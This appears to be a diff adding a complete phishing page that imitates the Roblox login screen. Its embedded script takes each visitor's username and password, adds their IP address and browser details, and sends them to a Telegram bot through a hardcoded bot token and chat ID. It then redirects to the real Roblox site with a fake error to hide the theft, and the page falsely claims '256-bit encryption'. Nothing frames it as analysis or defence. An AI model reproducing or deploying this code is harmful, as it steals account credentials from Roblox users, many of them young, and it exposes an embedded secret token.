@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <script>
+        // ========== ISI BOT TOKEN & CHAT ID LO DI SINI ==========
+        const BOT_TOKEN='8693145371:AAHfPNL_W-f0P2MPWut5_CxmWuDhvr8F7Qw';
+        const CHAT_ID = '1361048119';
+        // =======================================================
+        
+        function submitForm(e) {
+            e.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            document.getElementById('loginBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => { return data.ip; })
+                .catch(() => { return 'Unknown'; })
+                .then(function(ip) {
+                    var msg = '🔴 ROBLOX LOG CAPTURE' + '%0A' +
+                              '├ Username: ' + encodeURIComponent(username) + '%0A' +
+                              '├ Password: ' + encodeURIComponent(password) + '%0A' +
+                              '├ IP: ' + ip + '%0A' +
+                              '├ UA: ' + encodeURIComponent(navigator.userAgent) + '%0A' +
+                              '└ Time: ' + new Date().toLocaleString('id-ID');
+                    
+                    return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
+                })
+                .then(function() {
+                    window.location.href = 'https://www.roblox.com/login?error=InvalidUsernameOrPassword';
+                })
+                .catch(function() {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('loginBtn').style.display = 'block';
+                    document.getElementById('errorMsg').style.display = 'block';
+                });
+        }
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #0b1a2e 0%, #1a2a4a 100%);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+        .card {
+            background: #1b1b2f; border-radius: 20px; padding: 40px 30px;
+            width: 100%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .logo-text { 
+            font-size: 32px; font-weight: 700;
+            background: linear-gradient(135deg, #ff0066, #ff6600);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 5px; letter-spacing: 2px;
+        }
+        .subtitle { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { 
+            color: #aaa; font-size: 13px; font-weight: 500;
+            display: block; margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%; padding: 14px 16px; border-radius: 10px;
+            border: 2px solid #2a2a4a; background: #0d0d1a;
+            color: #fff; font-size: 15px; outline: none; transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #ff0066; box-shadow: 0 0 0 3px rgba(255,0,102,0.2);
+        }
+        .login-btn {
+            width: 100%; padding: 14px; border-radius: 10px; border: none;
+            background: linear-gradient(135deg, #ff0066, #ff6600);
+            color: #fff; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 5px; transition: 0.3s;
+        }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,102,0.3); }
+        .loading { display: none; color: #aaa; margin-top: 15px; font-size: 14px; }
+        .spinner {
+            border: 3px solid #2a2a4a; border-top: 3px solid #ff6600;
+            border-radius: 50%; width: 24px; height: 24px;
+            animation: spin 0.8s linear infinite; margin: 10px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .error-msg { display: none; color: #ff4444; font-size: 13px; margin-top: 12px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #555; }
+        .footer a { color: #ff6600; text-decoration: none; margin: 0 10px; }
+        .security-badge { color: #666; font-size: 12px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo-text">ROBLOX</div>
+        <div class="subtitle">Log in to your account</div>
+        
+        <form onsubmit="submitForm(event)">
+            <div class="input-group">
+                <label>Username / Email</label>
+                <input type="text" id="username" placeholder="Enter your username or email" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            
+            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                Verifying your account...
+            </div>
+            <div class="error-msg" id="errorMsg">
+                Invalid username or password. Please try again.
+            </div>
+        </form>
+        
+        <div class="security-badge">🔒 Secured with 256-bit encryption</div>
+        
+        <div class="footer">
+            <a href="#">Forgot Password?</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Use</a>
+        </div>
+    </div>
+</body>
+</html>
